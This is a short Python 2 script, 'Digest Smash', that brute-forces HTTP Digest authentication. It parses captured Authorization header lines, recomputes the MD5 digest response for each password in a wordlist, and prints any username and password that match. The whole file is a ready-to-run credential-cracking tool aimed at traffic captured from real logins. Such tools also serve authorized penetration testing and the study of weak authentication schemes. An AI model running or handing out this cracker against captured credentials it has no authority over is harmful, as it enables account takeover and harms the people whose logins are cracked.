import hashlib
import re
import sys
import argparse

# Add Help Context
parser = argparse.ArgumentParser(description='Digest Smash: BruteForce http.authorization & user:realm against passFile.', epilog="Be Kind, Please Rewind")
parser.add_argument('logfile', help='a file containing single line http.authorization captures')
parser.add_argument('passfile', help='a file containing single line passwords')
args = parser.parse_args()


# Variables
i = 0
file_name = sys.argv[1]
file_pass = sys.argv[2]

# Open File and Build RegEx strings
with open(file_name) as l:
  for line in l:
    i=i + 1
    chk = 0
    sUser = re.search('username=\"([^\"]*)\"', line)
    sRealm = re.search('realm=\"([^\"]*)\"', line)
    sUri = re.search('uri=\"([^\"]*)\"', line)
    sNonce = re.search('nonce=\"([^\"]*)\"', line)
    sNc = re.search('nc=\"([^\"]*)\"', line)
    if not hasattr(sNc, 'group'):
      sNc = re.search('nc=([^,]*),', line)
    sCnonce = re.search('cnonce=\"([^\"]*)\"', line)
    sQop = re.search('qop=\"([^\"]*)\"', line)
    if not hasattr(sQop, 'group'):
      sQop = re.search('qop=([^,]*),', line)
    sResponse = re.search('response=\"([^\"]*)\"',line)
    HA2 = hashlib.md5("GET:" + sUri.group(1)).hexdigest()
    sStack = sNonce.group(1)+":"+sNc.group(1)+":"+sCnonce.group(1)+":"+sQop.group(1)
 
    print str(i) + ": --> " + sUser.group(1) +":"+ sRealm.group(1),
    # Open password file and test
    with open(file_pass) as f:
      for line in f:
        my_str = sUser.group(1) + ":" + sRealm.group(1) + ":" + line.rstrip()
        HA1 = hashlib.md5(my_str).hexdigest()
        
        # Check reponse hash
        response = hashlib.md5(HA1 + ":" + sStack + ":" + HA2).hexdigest()
        if sResponse.group(1) == response:
          print " [PASS] "
          print "Username: " + sUser.group(1)
          print "Password: " + line.rstrip()
          chk = 1
          break
    f.close
    if chk == 0:
      print " [FAIL] "
l.closed
